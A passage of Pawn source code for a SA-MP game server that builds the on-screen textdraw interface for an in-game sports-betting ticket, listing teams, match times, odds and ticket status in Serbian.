				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 1 ] ), KladionicaListic[ playerid ][ Kvota ][ 1 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 2 ] ), KladionicaListic[ playerid ][ Kvota ][ 2 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 3 ] ), KladionicaListic[ playerid ][ Kvota ][ 3 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 4 ] ), KladionicaListic[ playerid ][ Kvota ][ 4 ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 7 ], str );
		}
		else if( broj == 6 ) {

			format( str, sizeof( str ), "%s~n~%s~n~%s~n~%s~n~%s~n~%s",
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 0 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 1 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 2 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 3 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 4 ] ][ teamName ],
				bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 5 ] ][ teamName ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 4 ], str );
		 	
		 	format( str, sizeof( str ), "%s~n~%s~n~%s~n~%s~n~%s~n~%s",
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 0 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 1 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 2 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 3 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 4 ] ][ teamName ],
				bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 5 ] ][ teamName ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 6 ], str );
		 	
		 	format( str, sizeof( str ), "%s~n~%s~n~%s~n~%s~n~%s~n~%s",
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 5 ], str );
		 	
		 	format( str, sizeof( str ), "%s______%.2f~n~%s______%.2f~n~%s______%.2f~n~%s______%.2f~n~%s______%.2f~n~%s______%.2f",
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 0 ] ), KladionicaListic[ playerid ][ Kvota ][ 0 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 1 ] ), KladionicaListic[ playerid ][ Kvota ][ 1 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 2 ] ), KladionicaListic[ playerid ][ Kvota ][ 2 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 3 ] ), KladionicaListic[ playerid ][ Kvota ][ 3 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 4 ] ), KladionicaListic[ playerid ][ Kvota ][ 4 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 5 ] ), KladionicaListic[ playerid ][ Kvota ][ 5 ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 7 ], str );
		}
		else if( broj == 7 ) {

			format( str, sizeof( str ), "%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s",
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 0 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 1 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 2 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 3 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 4 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 5 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 6 ] ][ teamName ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 4 ], str );
		 	
		 	format( str, sizeof( str ), "%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s",
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 0 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 1 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 2 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 3 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 4 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 5 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 6 ] ][ teamName ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 6 ], str );
		 	
		 	format( str, sizeof( str ), "%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s",
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 5 ], str );
		 	
		 	format( str, sizeof( str ), "%s______%.2f~n~%s______%.2f~n~%s______%.2f~n~%s______%.2f~n~%s______%.2f~n~%s______%.2f~n~%s______%.2f",
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 0 ] ), KladionicaListic[ playerid ][ Kvota ][ 0 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 1 ] ), KladionicaListic[ playerid ][ Kvota ][ 1 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 2 ] ), KladionicaListic[ playerid ][ Kvota ][ 2 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 3 ] ), KladionicaListic[ playerid ][ Kvota ][ 3 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 4 ] ), KladionicaListic[ playerid ][ Kvota ][ 4 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 5 ] ), KladionicaListic[ playerid ][ Kvota ][ 5 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 6 ] ), KladionicaListic[ playerid ][ Kvota ][ 6 ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 7 ], str );
		}
		else if( broj == 8 ) {

			format( str, sizeof( str ), "%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s",
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 0 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 1 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 2 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 3 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 4 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 5 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 6 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 7 ] ][ teamName ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 4 ], str );
		 	
		 	format( str, sizeof( str ), "%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s",
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 0 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 1 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 2 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 3 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 4 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 5 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 6 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 7 ] ][ teamName ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 6 ], str );
		 	
		 	format( str, sizeof( str ), "%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s",
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 5 ], str );
		 	
		 	format( str, sizeof( str ), "%s______%.2f~n~%s______%.2f~n~%s______%.2f~n~%s______%.2f~n~%s______%.2f~n~%s______%.2f~n~%s______%.2f~n~%s______%.2f",
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 0 ] ), KladionicaListic[ playerid ][ Kvota ][ 0 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 1 ] ), KladionicaListic[ playerid ][ Kvota ][ 1 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 2 ] ), KladionicaListic[ playerid ][ Kvota ][ 2 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 3 ] ), KladionicaListic[ playerid ][ Kvota ][ 3 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 4 ] ), KladionicaListic[ playerid ][ Kvota ][ 4 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 5 ] ), KladionicaListic[ playerid ][ Kvota ][ 5 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 6 ] ), KladionicaListic[ playerid ][ Kvota ][ 6 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 7 ] ), KladionicaListic[ playerid ][ Kvota ][ 7 ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 7 ], str );
		}
		else if( broj == 9 ) {

			format( str, sizeof( str ), "%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s",
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 0 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 1 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 2 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 3 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 4 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 5 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 6 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 7 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 8 ] ][ teamName ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 4 ], str );
		 	
		 	format( str, sizeof( str ), "%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s",
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 0 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 1 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 2 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 3 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 4 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 5 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 6 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 7 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 8 ] ][ teamName ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 6 ], str );
		 	
		 	format( str, sizeof( str ), "%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s",
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 5 ], str );
		 	
		 	format( str, sizeof( str ), "%s______%.2f~n~%s______%.2f~n~%s______%.2f~n~%s______%.2f~n~%s______%.2f~n~%s______%.2f~n~%s______%.2f~n~%s______%.2f~n~%s______%.2f",
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 0 ] ), KladionicaListic[ playerid ][ Kvota ][ 0 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 1 ] ), KladionicaListic[ playerid ][ Kvota ][ 1 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 2 ] ), KladionicaListic[ playerid ][ Kvota ][ 2 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 3 ] ), KladionicaListic[ playerid ][ Kvota ][ 3 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 4 ] ), KladionicaListic[ playerid ][ Kvota ][ 4 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 5 ] ), KladionicaListic[ playerid ][ Kvota ][ 5 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 6 ] ), KladionicaListic[ playerid ][ Kvota ][ 6 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 7 ] ), KladionicaListic[ playerid ][ Kvota ][ 7 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 8 ] ), KladionicaListic[ playerid ][ Kvota ][ 8 ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 7 ], str );
		}
		else if( broj == 10 ) {

			format( str, sizeof( str ), "%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s",
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 0 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 1 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 2 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 3 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 4 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 5 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 6 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 7 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 8 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 9 ] ][ teamName ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 4 ], str );
		 	
		 	format( str, sizeof( str ), "%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s",
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 0 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 1 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 2 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 3 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 4 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 5 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 6 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 7 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 8 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 9 ] ][ teamName ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 6 ], str );
		 	
		 	format( str, sizeof( str ), "%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s",
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 5 ], str );
		 	
		 	format( str, sizeof( str ), "%s______%.2f~n~%s______%.2f~n~%s______%.2f~n~%s______%.2f~n~%s______%.2f~n~%s______%.2f~n~%s______%.2f~n~%s______%.2f~n~%s______%.2f~n~%s______%.2f",
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 0 ] ), KladionicaListic[ playerid ][ Kvota ][ 0 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 1 ] ), KladionicaListic[ playerid ][ Kvota ][ 1 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 2 ] ), KladionicaListic[ playerid ][ Kvota ][ 2 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 3 ] ), KladionicaListic[ playerid ][ Kvota ][ 3 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 4 ] ), KladionicaListic[ playerid ][ Kvota ][ 4 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 5 ] ), KladionicaListic[ playerid ][ Kvota ][ 5 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 6 ] ), KladionicaListic[ playerid ][ Kvota ][ 6 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 7 ] ), KladionicaListic[ playerid ][ Kvota ][ 7 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 8 ] ), KladionicaListic[ playerid ][ Kvota ][ 8 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 9 ] ), KladionicaListic[ playerid ][ Kvota ][ 9 ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 7 ], str );
		}

		if( KladionicaListic[ playerid ][ Uplaceno ] && !KladionicaListic[ playerid ][ Zavrseno ] ) {
		
		    PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 23 ], "~g~Aktivan" );
		}
		else if( KladionicaListic[ playerid ][ Uplaceno ] && KladionicaListic[ playerid ][ Zavrseno ] && KladionicaListic[ playerid ][ Status ] ) {

		    PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 23 ], "~g~Dobitan" );
		}
		else if( KladionicaListic[ playerid ][ Uplaceno ] && KladionicaListic[ playerid ][ Zavrseno ] && !KladionicaListic[ playerid ][ Status ] ) {

		    PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 23 ], "~r~Gubitan" );
		}

        if( broj == 10 ) broj = 9;
        for( new i = 0; i < broj; i++ ) {

        	PlayerTextDrawShow( playerid, KladListicSM[ playerid ][ i ] );
		}

        for( new i = 0; i < 24; i ++ ) {

			PlayerTextDrawShow( playerid, KladionicaSM[ playerid ][ i ] );
		}
		MojListicPrikazan[ playerid ] = true;

	}
	else if( show == false ) {

        for( new i = 0; i < 9; i++ ) {

        	PlayerTextDrawHide( playerid, KladListicSM[ playerid ][ i ] );
			PlayerTextDrawDestroy( playerid, KladListicSM[ playerid ][ i ] );
			KladListicSM[ playerid ][ i ] = PlayerText:INVALID_TEXT_DRAW;
		}

		for( new i = 0; i < 24; i ++) {

		    PlayerTextDrawHide( playerid, KladionicaSM[ playerid ][ i ] );
			PlayerTextDrawDestroy( playerid, KladionicaSM[ playerid ][ i ] );
			KladionicaSM[ playerid ][ i ] = PlayerText:INVALID_TEXT_DRAW;
		}
		
		MojListicPrikazan[ playerid ] = false;
	}
}

stock KladionicaTDControl( playerid, bool:show ) {

	if( show == true ) {

		KladionicaSM[ playerid ][ 0 ] = CreatePlayerTextDraw(playerid, 525.125000, 143.250000, "usebox");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 0 ], 0.000000, 19.127779);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 0 ], 108.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 0 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 0 ], 0);
		PlayerTextDrawUseBox(playerid, KladionicaSM[ playerid ][ 0 ], true);
		PlayerTextDrawBoxColor(playerid, KladionicaSM[ playerid ][ 0 ], 102);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 0 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 0 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 0 ], 0);

		KladionicaSM[ playerid ][ 1 ] = CreatePlayerTextDraw(playerid, 115.625000, 172.083236, "Vreme i datum");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 1 ], 0.271249, 0.969998);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 1 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 1 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 1 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 1 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 1 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 1 ], 2);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 1 ], 1);

		KladionicaSM[ playerid ][ 2 ] = CreatePlayerTextDraw(playerid, 110.000000, 186.083328, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 2 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 2 ], 413.125000, -0.583323);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 2 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 2 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 2 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 2 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 2 ], 4);

		KladionicaSM[ playerid ][ 3 ] = CreatePlayerTextDraw(playerid, 110.375000, 167.833374, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 3 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 3 ], 412.500000, 0.583343);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 3 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 3 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 3 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 3 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 3 ], 4);

		KladionicaSM[ playerid ][ 4 ] = CreatePlayerTextDraw(playerid, 266.125000, 186.750015, "Manchester United~n~Manchester United~n~Manchester United~n~Manchester United~n~Manchester United~n~Manchester United~n~Manches");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 4 ], 0.249374, 0.940831);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 4 ], 2);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 4 ], SRVBOJA1 );
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 4 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 4 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 4 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 4 ], 2);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 4 ], 1);

		KladionicaSM[ playerid ][ 5 ] = CreatePlayerTextDraw(playerid, 114.500000, 187.500045, "29.09.2015 20:45~n~29.09.2015 20:45~n~29.09.2015 20:45~n~29.09.2015 20:45~n~29.09.2015 20:45~n~29.09.2015 20:45~n~29.09.2015 20");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 5 ], 0.249374, 0.940831);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 5 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 5 ], SRVBOJA1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 5 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 5 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 5 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 5 ], 2);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 5 ], 1);

		KladionicaSM[ playerid ][ 6 ] = CreatePlayerTextDraw(playerid, 381.500000, 187.166671, "Manchester United~n~Manchester United~n~Manchester United~n~Manchester United~n~Manchester United~n~Manchester United~n~Manches");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 6 ], 0.249374, 0.940831);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 6 ], 2);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 6 ], SRVBOJA1 );
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 6 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 6 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 6 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 6 ], 2);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 6 ], 1);

		KladionicaSM[ playerid ][ 7 ] = CreatePlayerTextDraw(playerid, 480.625000, 187.000030, "1.40 2.50 3.00~n~1.40 2.50 3.00~n~1.40 2.50 3.00~n~1.40 2.50 3.00~n~1.40 2.50 3.00~n~1.40 2.50 3.00~n~1.40 2.50 3.00~n~1.40 2.5");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 7 ], 0.249374, 0.940831);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 7 ], 2);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 7 ], SRVBOJA1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 7 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 7 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 7 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 7 ], 2);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 7 ], 1);

		KladionicaSM[ playerid ][ 8 ] = CreatePlayerTextDraw(playerid, 109.500000, 196.249954, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 8 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 8 ], 413.125000, -0.583323);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 8 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 8 ], -1);
